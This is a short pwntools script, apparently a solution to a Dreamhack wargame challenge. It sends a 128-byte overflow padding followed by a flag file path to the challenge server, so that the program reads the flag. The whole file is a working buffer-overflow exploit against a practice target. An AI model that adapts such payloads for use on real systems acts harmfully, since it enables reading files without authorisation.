from pwn import *

p = remote("host1.dreamhack.games", 14536)

payload = b'a' * 128
payload += b'/home/bof/flag'

p.sendlineafter(b'meow? ', payload)

p.interactive()